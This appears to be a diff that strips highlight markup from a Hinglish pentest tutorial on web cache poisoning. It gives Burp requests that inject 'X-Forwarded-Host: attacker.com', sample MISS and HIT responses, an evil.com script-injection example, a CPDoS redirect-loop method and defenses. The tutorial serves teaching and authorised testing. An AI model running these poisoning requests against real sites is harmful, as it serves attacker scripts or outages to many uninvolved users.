+* **Precise English:** Web Cache Poisoning occurs when an attacker exploits unkeyed parameters or HTTP headers to force a caching server (like Varnish or Cloudflare) to store a malicious response, which is then served to subsequent users requesting the same resource.
+* **Hinglish Simplification:** Jab hum server ke cache (fast memory) ko trick karke apna harmful data wahan save karwa dete hain, toh jab normal users wo URL kholte hain, unhe server ki jagah us cache se humara harmful data deliver hota hai.
 
-[[HL::### 🧠 4. Why This Matters::HL]]
+### 🧠 4. Why This Matters
 
-* [[HL::**Problem:** Normal **Reflected XSS** (Cross-Site Scripting — target application mein malicious JavaScript inject karna) ko execute karne ke liye victim ko ek phishing link pe click karwana padta hai.::HL]]
-* [[HL::**Solution:** Cache poisoning se payload directly server ke cache mein store ho jata hai. Attacker ko kisi ko link nahi bhejna padta — victim jab normal legal URL bhi visit karega, toh usko exploit trigger ho jayega.::HL]]
-[[HL::* **What breaks?** Yeh vulnerability APIs aur web apps pe massive scale attack allow karti hai — ek hi jhatke mein hazaron users compromise ho sakte hain.::HL]]
-* **✅ [[HL::Kab use karo:** Jab target application **Cloudflare** (CDN / Web protection service) ya **Varnish** (caching proxy) use karti ho aur HTTP response mein `X-Cache: HIT` ya `CF-Cache-Status: HIT` headers dikhein.::HL]]
-[[HL::* **❌ Kab mat karo:** Agar response mein `Cache-Control: no-cache` ho, ya har request pe `MISS` aa raha ho, toh cache poisoning possible nahi hai. Live production user-facing URLs ko test mat karo bina cache-buster (`?cb=123`) lagaye warna real users attack ho jayenge.::HL]]
+* **Problem:** Normal **Reflected XSS** (Cross-Site Scripting — target application mein malicious JavaScript inject karna) ko execute karne ke liye victim ko ek phishing link pe click karwana padta hai.
+* **Solution:** Cache poisoning se payload directly server ke cache mein store ho jata hai. Attacker ko kisi ko link nahi bhejna padta — victim jab normal legal URL bhi visit karega, toh usko exploit trigger ho jayega.
+* **What breaks?** Yeh vulnerability APIs aur web apps pe massive scale attack allow karti hai — ek hi jhatke mein hazaron users compromise ho sakte hain.
+* **✅ Kab use karo:** Jab target application **Cloudflare** (CDN / Web protection service) ya **Varnish** (caching proxy) use karti ho aur HTTP response mein `X-Cache: HIT` ya `CF-Cache-Status: HIT` headers dikhein.
+* **❌ Kab mat karo:** Agar response mein `Cache-Control: no-cache` ho, ya har request pe `MISS` aa raha ho, toh cache poisoning possible nahi hai. Live production user-facing URLs ko test mat karo bina cache-buster (`?cb=123`) lagaye warna real users attack ho jayenge.
 
-[[HL::### 🔍 5. Visual / Terminal Mein Kya Dikhega::HL]]
+### 🔍 5. Visual / Terminal Mein Kya Dikhega
 
-[[HL::Burp Suite response headers mein `CF-Cache-Status: HIT` aur body mein tumhara inject kiya hua `evil.com` ya XSS payload dikhega — bina URL mein payload bheje.::HL]]
+Burp Suite response headers mein `CF-Cache-Status: HIT` aur body mein tumhara inject kiya hua `evil.com` ya XSS payload dikhega — bina URL mein payload bheje.
 
-[[HL::### ⚙️ 6. Under the Hood (Attack Flow)::HL]]
+### ⚙️ 6. Under the Hood (Attack Flow)
 
-[[HL::1. **Keyed vs Unkeyed:** Caching server ek URL ko "Cache Key" (jaise `URL path` + `Host header`) se pehchanta hai. Jo headers is key ka hissa nahi hote (like `X-Forwarded-Host`), unhe **Unkeyed Parameters** kehte hain.::HL]]
-[[HL::2. **Attacker Injection:** Attacker ek aisi request bhejta hai jiska cache key valid ho, par usme ek malicious unkeyed header (`X-Forwarded-Host: evil.com`) hota hai.::HL]]
-[[HL::3. **Server Reflection:** Origin server us unkeyed header ko padhta hai aur response body mein daal deta hai (e.g., `<script src="http://evil.com/script.js">`).::HL]]
-[[HL::4. **Cache Storage:** Caching layer dekhti hai ki URL valid hai, aur is malicious response ko us Cache Key ke under store kar leti hai.::HL]]
-[[HL::5. **Mass Exploitation:** Ab normal user jab bhi us valid URL pe jayega, usko cached response milega jisme attacker ka `evil.com` payload hoga.::HL]]
+1. **Keyed vs Unkeyed:** Caching server ek URL ko "Cache Key" (jaise `URL path` + `Host header`) se pehchanta hai. Jo headers is key ka hissa nahi hote (like `X-Forwarded-Host`), unhe **Unkeyed Parameters** kehte hain.
+2. **Attacker Injection:** Attacker ek aisi request bhejta hai jiska cache key valid ho, par usme ek malicious unkeyed header (`X-Forwarded-Host: evil.com`) hota hai.
+3. **Server Reflection:** Origin server us unkeyed header ko padhta hai aur response body mein daal deta hai (e.g., `<script src="http://evil.com/script.js">`).
+4. **Cache Storage:** Caching layer dekhti hai ki URL valid hai, aur is malicious response ko us Cache Key ke under store kar leti hai.
+5. **Mass Exploitation:** Ab normal user jab bhi us valid URL pe jayega, usko cached response milega jisme attacker ka `evil.com` payload hoga.
 
-[[HL::### 💻 7. Hands-On — Lab-Ready Commands::HL]]
+### 💻 7. Hands-On — Lab-Ready Commands
 
-[[HL::**Step 1: Finding Unkeyed Headers with Param Miner:**::HL]]
-[[HL::*(Param Miner ek Burp extension hai jo automatically hidden headers guess karta hai)*::HL]]
+**Step 1: Finding Unkeyed Headers with Param Miner:**
+*(Param Miner ek Burp extension hai jo automatically hidden headers guess karta hai)*
 
-[[HL::* Burp Suite mein request pe Right Click -> `Extensions` -> `Param Miner` -> `Guess Headers`.::HL]]
-[[HL::* Result mein Param Miner batayega: `Found unkeyed header: X-Forwarded-Host`.::HL]]
+* Burp Suite mein request pe Right Click -> `Extensions` -> `Param Miner` -> `Guess Headers`.
+* Result mein Param Miner batayega: `Found unkeyed header: X-Forwarded-Host`.
 
-[[HL::**Step 2: Crafting the Poisoned Request (Burp Repeater):**::HL]]
+**Step 2: Crafting the Poisoned Request (Burp Repeater):**
 
-[[HL::```http::HL]]
-[[HL::# Burp Suite | HTTP Request::HL]]
-[[HL::1 GET /api/v1/profile?cb=12345 HTTP/1.1  # cb=12345 ek "Cache Buster" hai taaki live app ke real users affect na ho (Safe pentesting)::HL]]
-[[HL::2 Host: target-api.com::HL]]
-[[HL::3 X-Forwarded-Host: attacker.com  # X-Forwarded-Host = Unkeyed header jisme hum apna payload daal rahe hain::HL]]
+```http
+# Burp Suite | HTTP Request
+1 GET /api/v1/profile?cb=12345 HTTP/1.1  # cb=12345 ek "Cache Buster" hai taaki live app ke real users affect na ho (Safe pentesting)
+2 Host: target-api.com
+3 X-Forwarded-Host: attacker.com  # X-Forwarded-Host = Unkeyed header jisme hum apna payload daal rahe hain
 
-[[HL::```::HL]]
+```
 
-[[HL::**Step 3: Checking the Response (Cache MISS):**::HL]]
+**Step 3: Checking the Response (Cache MISS):**
 
-[[HL::```http::HL]]
-[[HL::# 📤 Expected Output (Burp Response 1):::HL]]
-[[HL::1 HTTP/1.1 200 OK::HL]]
-[[HL::2 CF-Cache-Status: MISS  # MISS matlab pehli baar request backend server tak aayi hai aur cache ho gayi hai::HL]]
-[[HL::3 ::HL]]
-[[HL::4 {"profile_url": "https://attacker.com/profile/me"}  # Target app ne humara injected X-Forwarded-Host reflect kar diya::HL]]
+```http
+# 📤 Expected Output (Burp Response 1):
+1 HTTP/1.1 200 OK
+2 CF-Cache-Status: MISS  # MISS matlab pehli baar request backend server tak aayi hai aur cache ho gayi hai
+3 
+4 {"profile_url": "https://attacker.com/profile/me"}  # Target app ne humara injected X-Forwarded-Host reflect kar diya
 
-[[HL::```::HL]]
+```
 
-[[HL::**Step 4: Confirming the Cache Poisoning (Cache HIT):**::HL]]
-[[HL::*(Request ko bina `X-Forwarded-Host` ke dobara bhejo par same `cb=12345` ke sath)*::HL]]
+**Step 4: Confirming the Cache Poisoning (Cache HIT):**
+*(Request ko bina `X-Forwarded-Host` ke dobara bhejo par same `cb=12345` ke sath)*
 
-[[HL::```http::HL]]
-[[HL::# Burp Suite | Normal Request::HL]]
-[[HL::1 GET /api/v1/profile?cb=12345 HTTP/1.1::HL]]
-[[HL::2 Host: target-api.com::HL]]
+```http
+# Burp Suite | Normal Request
+1 GET /api/v1/profile?cb=12345 HTTP/1.1
+2 Host: target-api.com
 
-[[HL::```::HL]]
+```
 
-[[HL::```http::HL]]
-[[HL::# 📤 Expected Output (Burp Response 2):::HL]]
-[[HL::1 HTTP/1.1 200 OK::HL]]
-[[HL::2 CF-Cache-Status: HIT  # HIT matlab response direct cache se aaya hai::HL]]
-[[HL::3 ::HL]]
-[[HL::4 {"profile_url": "https://attacker.com/profile/me"}  # Normal request hone ke bawajood attacker.com dikh raha hai! Poisoning successful.::HL]]
+```http
+# 📤 Expected Output (Burp Response 2):
+1 HTTP/1.1 200 OK
+2 CF-Cache-Status: HIT  # HIT matlab response direct cache se aaya hai
+3 
+4 {"profile_url": "https://attacker.com/profile/me"}  # Normal request hone ke bawajood attacker.com dikh raha hai! Poisoning successful.
 
-[[HL::```::HL]]
+```
 
-[[HL::#### 🛠️ Step-by-Step GUI Navigation (Burp Param Miner)::HL]]
+#### 🛠️ Step-by-Step GUI Navigation (Burp Param Miner)
 
-[[HL::1. Request pe Right click > `Extensions` > `Param Miner` > `Guess Headers`.::HL]]
-[[HL::2. Extender/Logger tab mein check karo. Agar likha aaye `Found unkeyed header: X-Forwarded-Host`, toh usse copy karo.::HL]]
-[[HL::3. Repeater mein jao, ek random `?cb=random123` (cache buster) URL mein add karo taaki tum apni ek fresh cache key bana sako.::HL]]
-[[HL::4. Unkeyed header add karo aur payload inject karo. Send karo.::HL]]
-[[HL::5. `CF-Cache-Status: HIT` ya `X-Cache: HIT` aane ka wait karo.::HL]]
-[[HL::6. Header hata kar verify karo ki URL HIT ho raha hai aur tumhara payload abhi bhi aara hai.::HL]]
+1. Request pe Right click > `Extensions` > `Param Miner` > `Guess Headers`.
+2. Extender/Logger tab mein check karo. Agar likha aaye `Found unkeyed header: X-Forwarded-Host`, toh usse copy karo.
+3. Repeater mein jao, ek random `?cb=random123` (cache buster) URL mein add karo taaki tum apni ek fresh cache key bana sako.
+4. Unkeyed header add karo aur payload inject karo. Send karo.
+5. `CF-Cache-Status: HIT` ya `X-Cache: HIT` aane ka wait karo.
+6. Header hata kar verify karo ki URL HIT ho raha hai aur tumhara payload abhi bhi aara hai.
 
-[[HL::### 🔒 8. Attack Surface & Defense::HL]]
+### 🔒 8. Attack Surface & Defense
 
-[[HL::**🔴 Attacker Perspective:** APIs mein cache poisoning jyadatar JSON injection, token stealing scripts load karwane, ya password reset links ko hijack karne ke liye use hoti hai (agar email templates mein host dynamically generate ho raha ho).::HL]]
-[[HL::**🔵 Defender Perspective:** - Strict Cache Keys: Aise headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`) jo API application backend pe use hote hain, unko caching proxy pe "Cache Key" ka hissa bana do.::HL]]
+**🔴 Attacker Perspective:** APIs mein cache poisoning jyadatar JSON injection, token stealing scripts load karwane, ya password reset links ko hijack karne ke liye use hoti hai (agar email templates mein host dynamically generate ho raha ho).
+**🔵 Defender Perspective:** - Strict Cache Keys: Aise headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`) jo API application backend pe use hote hain, unko caching proxy pe "Cache Key" ka hissa bana do.
 
-[[HL::* Disable Unkeyed Headers: Agar framework in headers ko use nahi karta, toh caching layer pe inhe drop ya sanitize kar do taaki origin server tak pahuche hi na.::HL]]
+* Disable Unkeyed Headers: Agar framework in headers ko use nahi karta, toh caching layer pe inhe drop ya sanitize kar do taaki origin server tak pahuche hi na.
 
-[[HL::### 🌍 9. Real-World Penetration Testing Use-Case::HL]]
+### 🌍 9. Real-World Penetration Testing Use-Case
 
-[[HL::Real-world bug bounty mein API cache poisoning bahut destructive ho sakti hai. HackerOne pe ek report thi jahan ek attacker ne `X-Forwarded-Host: attacker.com` cache poison kiya web app ki JS file path ke liye. Result yeh tha ki app visit karne wale har user ka browser target server ki jagah attacker ki server se malicious JavaScript download karke run karne laga. Attacker ko massive impact ki wajah se P1 bounty mili. Pentesting karte waqt HAMESHA ek `?cb=` parameter (cache buster) lagao, warna live production server poison ho jayega aur client ka business band ho sakta hai.::HL]]
+Real-world bug bounty mein API cache poisoning bahut destructive ho sakti hai. HackerOne pe ek report thi jahan ek attacker ne `X-Forwarded-Host: attacker.com` cache poison kiya web app ki JS file path ke liye. Result yeh tha ki app visit karne wale har user ka browser target server ki jagah attacker ki server se malicious JavaScript download karke run karne laga. Attacker ko massive impact ki wajah se P1 bounty mili. Pentesting karte waqt HAMESHA ek `?cb=` parameter (cache buster) lagao, warna live production server poison ho jayega aur client ka business band ho sakta hai.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-[[HL::* **❌ Mistake:** Live production site ke home page (`/` ya `/api/login`) ko poison test karna bina kisi unique parameter ke.::HL]]
-[[HL::* **🤦 Why:** Beginners excitement mein seedha live site pe payload bhej dete hain aur cache HIT ho jata hai.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Hamesha URL ke end mein ek cache buster parameter lagao jaise `?cb=987654` ya `?dontcacheme=1`. Isse tumhara ek separate cache block banta hai jo baaki real users ko affect nahi karta.::HL]]
-[[HL::* **⚡ Consequences:** Agar tumne main page poison kar diya, toh agle kuch ghanto tak saare real users ko app khulte hi XSS alert popup aayega. Company tumpe legal action le sakti hai.::HL]]
-[[HL::* **❌ Mistake:** Param Miner lagake chhod dena aur Repeater mein manually headers test na karna.::HL]]
-[[HL::* **🤦 Why:** Automated tools false positives dete hain.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Param Miner se header lo, Repeater mein manually daalo, aur verify karo ki `MISS` hone ke baad agli request `HIT` hone pe payload persist karta hai.::HL]]
-[[HL::* **⚡ Consequences:** Report "Not Reproducible" mark ho jayegi.::HL]]
+* **❌ Mistake:** Live production site ke home page (`/` ya `/api/login`) ko poison test karna bina kisi unique parameter ke.
+* **🤦 Why:** Beginners excitement mein seedha live site pe payload bhej dete hain aur cache HIT ho jata hai.
+* **✅ The 'Pro' Way:** Hamesha URL ke end mein ek cache buster parameter lagao jaise `?cb=987654` ya `?dontcacheme=1`. Isse tumhara ek separate cache block banta hai jo baaki real users ko affect nahi karta.
+* **⚡ Consequences:** Agar tumne main page poison kar diya, toh agle kuch ghanto tak saare real users ko app khulte hi XSS alert popup aayega. Company tumpe legal action le sakti hai.
+* **❌ Mistake:** Param Miner lagake chhod dena aur Repeater mein manually headers test na karna.
+* **🤦 Why:** Automated tools false positives dete hain.
+* **✅ The 'Pro' Way:** Param Miner se header lo, Repeater mein manually daalo, aur verify karo ki `MISS` hone ke baad agli request `HIT` hone pe payload persist karta hai.
+* **⚡ Consequences:** Report "Not Reproducible" mark ho jayegi.
 
-[[HL::### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)::HL]]
+### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)
 
-[[HL::* **Confusion 1 — "Kya Cache Poisoning aur Stored XSS same cheez hai?"**::HL]]
-[[HL::* **Galat soch:** Dono mein payload server pe save hota hai aur sabko dikhta hai, toh same hain.::HL]]
-[[HL::* **Actually:** Stored XSS mein payload database mein permanent save ho jata hai (jaise ek comment). Cache poisoning mein payload temporary cache layer (memory) mein save hota hai. Cache expire hote hi payload gayab ho jayega (usually kuch minutes/hours mein).::HL]]
-[[HL::* **Prove karo:** Cache poisoned URL ko ek din baad visit karo — payload automatically remove ho gaya hoga.::HL]]
+* **Confusion 1 — "Kya Cache Poisoning aur Stored XSS same cheez hai?"**
+* **Galat soch:** Dono mein payload server pe save hota hai aur sabko dikhta hai, toh same hain.
+* **Actually:** Stored XSS mein payload database mein permanent save ho jata hai (jaise ek comment). Cache poisoning mein payload temporary cache layer (memory) mein save hota hai. Cache expire hote hi payload gayab ho jayega (usually kuch minutes/hours mein).
+* **Prove karo:** Cache poisoned URL ko ek din baad visit karo — payload automatically remove ho gaya hoga.
 
 
-[[HL::* **Confusion 2 — "X-Forwarded-Host ka kya matlab hai?"**::HL]]
-[[HL::* **Galat soch:** Yeh bas random hacking header hai.::HL]]
-[[HL::* **Actually:** Yeh ek legitimate HTTP header hai jo reverse proxies (jaise Nginx, load balancers) use karti hain backend server ko batane ke liye ki "Original client ne URL me konsa domain type kiya tha." Agar backend in headers pe ankh band karke bharosa kar le, toh vulnerability banti hai.::HL]]
-[[HL::* **Prove karo:** Burp Repeater mein ye header modify karke dekho agar target ka password reset token link attacker URL pe redirect ho raha hai ya nahi.::HL]]
+* **Confusion 2 — "X-Forwarded-Host ka kya matlab hai?"**
+* **Galat soch:** Yeh bas random hacking header hai.
+* **Actually:** Yeh ek legitimate HTTP header hai jo reverse proxies (jaise Nginx, load balancers) use karti hain backend server ko batane ke liye ki "Original client ne URL me konsa domain type kiya tha." Agar backend in headers pe ankh band karke bharosa kar le, toh vulnerability banti hai.
+* **Prove karo:** Burp Repeater mein ye header modify karke dekho agar target ka password reset token link attacker URL pe redirect ho raha hai ya nahi.
 
 
-[[HL::* **Confusion 3 — "Keyed aur Unkeyed Parameters mein kya farq hai?"**::HL]]
-[[HL::* **Galat soch:** Dono cache ko samajhne ke liye equal terms hain.::HL]]
-[[HL::* **Actually:** Cache Keyed parameter = URL Path + Host + User Agent. (Agar inme ek character bhi change hua toh naya cache banega). Unkeyed parameter = Baki saare headers (`X-Forwarded-Host`, `X-Custom-Header`). Caching server inko ignore karta hai cache banate waqt. Isliye cache poison karne ke liye hum *unkeyed* use karte hain taaki Key change na ho aur payload sabko dikhe.::HL]]
+* **Confusion 3 — "Keyed aur Unkeyed Parameters mein kya farq hai?"**
+* **Galat soch:** Dono cache ko samajhne ke liye equal terms hain.
+* **Actually:** Cache Keyed parameter = URL Path + Host + User Agent. (Agar inme ek character bhi change hua toh naya cache banega). Unkeyed parameter = Baki saare headers (`X-Forwarded-Host`, `X-Custom-Header`). Caching server inko ignore karta hai cache banate waqt. Isliye cache poison karne ke liye hum *unkeyed* use karte hain taaki Key change na ho aur payload sabko dikhe.
 
 
 
-[[HL::### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)::HL]]
+### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)
 
-[[HL::* **`Burp Response shows Cache-Control: max-age=0, no-cache`**::HL]]
-[[HL::* **Root Cause:** Target server cache mechanism disable karke baitha hai. Ya dynamically aisi settings push kar raha hai jo cache bypass karti hain.::HL]]
-[[HL::* **Fix:** Is endpoint pe cache poisoning impossible hai. Kisi static endpoint jaise `/api/config.json` ya `/assets/main.js` pe attack try karo jahan `max-age` lamba ho.::HL]]
+* **`Burp Response shows Cache-Control: max-age=0, no-cache`**
+* **Root Cause:** Target server cache mechanism disable karke baitha hai. Ya dynamically aisi settings push kar raha hai jo cache bypass karti hain.
+* **Fix:** Is endpoint pe cache poisoning impossible hai. Kisi static endpoint jaise `/api/config.json` ya `/assets/main.js` pe attack try karo jahan `max-age` lamba ho.
 
 
-[[HL::* **`Param Miner found unkeyed header, but it's not reflecting in body`**::HL]]
-[[HL::* **Root Cause:** Backend server unkeyed header ko process zaroor kar raha hai, par response mein wapas likh nahi raha. (Non-reflected).::HL]]
-[[HL::* **Fix:** Us header ko SSaaS/OAST (Burp Collaborator) payloads ke sath test karo. Ho sakta hai server SSRF ya out-of-band request trigger kar raha ho bhale body mein kuch reflect na ho.::HL]]
+* **`Param Miner found unkeyed header, but it's not reflecting in body`**
+* **Root Cause:** Backend server unkeyed header ko process zaroor kar raha hai, par response mein wapas likh nahi raha. (Non-reflected).
+* **Fix:** Us header ko SSaaS/OAST (Burp Collaborator) payloads ke sath test karo. Ho sakta hai server SSRF ya out-of-band request trigger kar raha ho bhale body mein kuch reflect na ho.
 
 
-[[HL::* **`CF-Cache-Status shows MISS every time`**::HL]]
-[[HL::* **Root Cause:** Caching server tumhari request ki cache rule nahi bana raha. URL mein parameters ho sakte hain jo uncacheable set kiye gaye hon (Jaise POST requests kbhi cache nahi hoti).::HL]]
-[[HL::* **Fix:** Sirf `GET` requests test karo. Agar URL ke query params filter ho rahe hain, toh Param Miner se Unkeyed Header dhoondhne pe focus karo na ki Unkeyed Parameters.::HL]]
+* **`CF-Cache-Status shows MISS every time`**
+* **Root Cause:** Caching server tumhari request ki cache rule nahi bana raha. URL mein parameters ho sakte hain jo uncacheable set kiye gaye hon (Jaise POST requests kbhi cache nahi hoti).
+* **Fix:** Sirf `GET` requests test karo. Agar URL ke query params filter ho rahe hain, toh Param Miner se Unkeyed Header dhoondhne pe focus karo na ki Unkeyed Parameters.
 
 
 
-[[HL::### ⚖️ 13. Comparison (Cache Poisoning vs Reflected XSS)::HL]]
+### ⚖️ 13. Comparison (Cache Poisoning vs Reflected XSS)
 
-[[HL::| Feature | Reflected XSS | Cache Poisoning |::HL]]
-[[HL::| --- | --- | --- |::HL]]
-[[HL::| **Execution** | Victim ko ek malicious link (jisme payload ho) bhejna padta hai. | Payload cache mein hota hai. Victim sirf legit safe URL open karta hai. |::HL]]
-[[HL::| **Storage** | Kahin store nahi hota. Har request mein naya bhejna padta hai. | Caching Proxy (Varnish/Cloudflare) mein temporarily save ho jata hai. |::HL]]
-[[HL::| **Impact Radius** | Sirf wohi user hack hoga jo link click karega. (1-to-1) | Ek baar HIT hua, uske baad aanewale hazaron users automatically hack honge. (1-to-Many) |::HL]]
+| Feature | Reflected XSS | Cache Poisoning |
+| --- | --- | --- |
+| **Execution** | Victim ko ek malicious link (jisme payload ho) bhejna padta hai. | Payload cache mein hota hai. Victim sirf legit safe URL open karta hai. |
+| **Storage** | Kahin store nahi hota. Har request mein naya bhejna padta hai. | Caching Proxy (Varnish/Cloudflare) mein temporarily save ho jata hai. |
+| **Impact Radius** | Sirf wohi user hack hoga jo link click karega. (1-to-1) | Ek baar HIT hua, uske baad aanewale hazaron users automatically hack honge. (1-to-Many) |
 
-[[HL::### 🔄 14. Kill Chain & Attack Phase Flow::HL]]
+### 🔄 14. Kill Chain & Attack Phase Flow
 
-[[HL::* ⚔️ **Attack Phase:** Exploitation::HL]]
-[[HL::* 📍 **Kill Chain Position:** Weaponization ke time jahan attacker malicious unkeyed header ko store karvata hai.::HL]]
-[[HL::* 🔗 **This connects to:** Recon (Param Miner) -> Weaponization (Payload Crafting) -> Exploitation (Cache Poison).::HL]]
-[[HL::* 🔄 **Flow:** Discover Caching Server -> Find Unkeyed Reflected Header -> Craft Poison Request -> Send until `Cache HIT` -> Normal Users receive Exploit.::HL]]
+* ⚔️ **Attack Phase:** Exploitation
+* 📍 **Kill Chain Position:** Weaponization ke time jahan attacker malicious unkeyed header ko store karvata hai.
+* 🔗 **This connects to:** Recon (Param Miner) -> Weaponization (Payload Crafting) -> Exploitation (Cache Poison).
+* 🔄 **Flow:** Discover Caching Server -> Find Unkeyed Reflected Header -> Craft Poison Request -> Send until `Cache HIT` -> Normal Users receive Exploit.
 
-[[HL::### 🎨 15. Visual Diagram (ASCII Art — Cache Poisoning Flow)::HL]]
+### 🎨 15. Visual Diagram (ASCII Art — Cache Poisoning Flow)
 
-[[HL::```text::HL]]
-[[HL::[Phase 1: Poisoning the Cache]::HL]]
-[[HL::[Attacker] ---(GET /api/data, X-Forwarded-Host: evil.com)---> [Cache Server]::HL]]
-[[HL::                                                                (MISS)::HL]]
-[[HL::                                                                  |::HL]]
-[[HL::[Cache stores "evil.com" payload under "/api/data" KEY] <--- [Origin Server]::HL]]
+```text
+[Phase 1: Poisoning the Cache]
+[Attacker] ---(GET /api/data, X-Forwarded-Host: evil.com)---> [Cache Server]
+                                                                (MISS)
+                                                                  |
+[Cache stores "evil.com" payload under "/api/data" KEY] <--- [Origin Server]
 
-[[HL::-----------------------------------------------------------------------------::HL]]
-[[HL::[Phase 2: Mass Exploitation]::HL]]
-[[HL::[Normal User 1] ---(GET /api/data)---> [Cache Server]::HL]]
-[[HL::                                          (HIT) ---> Returns "evil.com" payload!::HL]]
+-----------------------------------------------------------------------------
+[Phase 2: Mass Exploitation]
+[Normal User 1] ---(GET /api/data)---> [Cache Server]
+                                          (HIT) ---> Returns "evil.com" payload!
                                           
-[[HL::[Normal User 2] ---(GET /api/data)---> [Cache Server]::HL]]
-[[HL::                                          (HIT) ---> Returns "evil.com" payload!::HL]]
+[Normal User 2] ---(GET /api/data)---> [Cache Server]
+                                          (HIT) ---> Returns "evil.com" payload!
 
-[[HL::```::HL]]
+```
 
-[[HL::### ❓ 16. Interview & Certification Exam Q&A::HL]]
+### ❓ 16. Interview & Certification Exam Q&A
 
-[[HL::* **Q: What is the role of an 'unkeyed parameter' in web cache poisoning?**::HL]]
-[[HL::* **A:** Unkeyed parameter (jaise `X-Forwarded-Host`) cache key ka hissa nahi hote. Matlab cache server inhe ignore karta hai jab wo decide karta hai ki response serve karna hai ya naya fetch karna hai. Isliye attacker in unkeyed headers me payload daalta hai taaki URL ka main structure same rahe, par backend server response modify kar de aur caching proxy us modified response ko normal legit URL par cache kar de.::HL]]
+* **Q: What is the role of an 'unkeyed parameter' in web cache poisoning?**
+* **A:** Unkeyed parameter (jaise `X-Forwarded-Host`) cache key ka hissa nahi hote. Matlab cache server inhe ignore karta hai jab wo decide karta hai ki response serve karna hai ya naya fetch karna hai. Isliye attacker in unkeyed headers me payload daalta hai taaki URL ka main structure same rahe, par backend server response modify kar de aur caching proxy us modified response ko normal legit URL par cache kar de.
 
 
-[[HL::* **Q: Why must you use a cache buster parameter like `?cb=123` when pentesting cache poisoning?**::HL]]
-[[HL::* **A:** Ek cache buster URL ko globally unique bana deta hai. Agar hum live server (production) ke URL `/api/users` ko bina iske poison kar denge, toh jab tak cache refresh nahi hoti, real legitimate customers ka app crash ho jayega ya unhe attacker ka payload dikhega. `cb=123` ensure karta hai ki cache poison sirf hamari test URL pe hi apply ho, real users safe rahein.::HL]]
+* **Q: Why must you use a cache buster parameter like `?cb=123` when pentesting cache poisoning?**
+* **A:** Ek cache buster URL ko globally unique bana deta hai. Agar hum live server (production) ke URL `/api/users` ko bina iske poison kar denge, toh jab tak cache refresh nahi hoti, real legitimate customers ka app crash ho jayega ya unhe attacker ka payload dikhega. `cb=123` ensure karta hai ki cache poison sirf hamari test URL pe hi apply ho, real users safe rahein.
 
 
-[[HL::* **Q: What does `CF-Cache-Status: MISS` mean, and how does it relate to this attack?**::HL]]
-[[HL::* **A:** Cloudflare ke is header ka matlab hai ki request cache server mein nahi mili, aur backend origin server se fetch karni padi. Cache poison tabhi start hota hai jab `MISS` hota hai (attacker ki request backend se process hoke cache m save ho), aur attack successful hone ka proof tab milta hai jab request `HIT` milti hai without the payload parameter.::HL]]
+* **Q: What does `CF-Cache-Status: MISS` mean, and how does it relate to this attack?**
+* **A:** Cloudflare ke is header ka matlab hai ki request cache server mein nahi mili, aur backend origin server se fetch karni padi. Cache poison tabhi start hota hai jab `MISS` hota hai (attacker ki request backend se process hoke cache m save ho), aur attack successful hone ka proof tab milta hai jab request `HIT` milti hai without the payload parameter.
 
 
-[[HL::* **Q: You injected `X-Forwarded-Scheme: http` and the server responded with a 301 Redirect to the same URL over HTTP. How do you poison this?**::HL]]
-[[HL::* **A:** Yeh "Cache Poisoned Denial of Service (CPDoS)" ka route hai. Attacker HTTPS request ko `X-Forwarded-Scheme: http` laga ke bhejta hai. Origin server ek HTTP pe redirect (`301`) deta hai. Cache us `301` ko cache kar legi. Ab real users HTTPS URL kholenge, cache unhe wapas HTTP pe bhejegi, browser HTTPS redirect karega — ek infinite redirect loop ban jayega aur app sabke liye crash ho jayegi.::HL]]
+* **Q: You injected `X-Forwarded-Scheme: http` and the server responded with a 301 Redirect to the same URL over HTTP. How do you poison this?**
+* **A:** Yeh "Cache Poisoned Denial of Service (CPDoS)" ka route hai. Attacker HTTPS request ko `X-Forwarded-Scheme: http` laga ke bhejta hai. Origin server ek HTTP pe redirect (`301`) deta hai. Cache us `301` ko cache kar legi. Ab real users HTTPS URL kholenge, cache unhe wapas HTTP pe bhejegi, browser HTTPS redirect karega — ek infinite redirect loop ban jayega aur app sabke liye crash ho jayegi.
 
 
-[[HL::* **Q: Which Burp Suite tool is best suited for finding cache poisoning vulnerabilities?**::HL]]
-[[HL::* **A:** 'Param Miner' extension. Yeh request ke backend pe hundreds of common unkeyed headers (`X-Forwarded-Host`, `X-Host`, `Forwarded`, etc.) bhejta hai aur check karta hai ki konsa header response modify ya reflect karwa raha hai.::HL]]
+* **Q: Which Burp Suite tool is best suited for finding cache poisoning vulnerabilities?**
+* **A:** 'Param Miner' extension. Yeh request ke backend pe hundreds of common unkeyed headers (`X-Forwarded-Host`, `X-Host`, `Forwarded`, etc.) bhejta hai aur check karta hai ki konsa header response modify ya reflect karwa raha hai.
 
 
 
-[[HL::### 📝 17. One-Line Memory Hook::HL]]
+### 📝 17. One-Line Memory Hook
 
-[[HL::**"Unkeyed header reflect hua + Cache HIT aaya = Cache Poisoning success (ab bina click sabka system hack hoga)!"**::HL]]
+**"Unkeyed header reflect hua + Cache HIT aaya = Cache Poisoning success (ab bina click sabka system hack hoga)!"**
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```text::HL]]
-[[HL::🔑 Keywords Coverage Check — API Cache Poisoning::HL]]
-[[HL::✅ Covered    : API Cache poisoning, caching layers, Varnish, Cloudflare, unkeyed parameters, keyed parameters, `X-Forwarded-Host`, `X-Forwarded-Scheme`, reflected XSS, cache hit, `CF-Cache-Status: HIT`::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED     : (none)::HL]]
+```text
+🔑 Keywords Coverage Check — API Cache Poisoning
+✅ Covered    : API Cache poisoning, caching layers, Varnish, Cloudflare, unkeyed parameters, keyed parameters, `X-Forwarded-Host`, `X-Forwarded-Scheme`, reflected XSS, cache hit, `CF-Cache-Status: HIT`
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED     : (none)
 
-[[HL::```::HL]]
+```
 
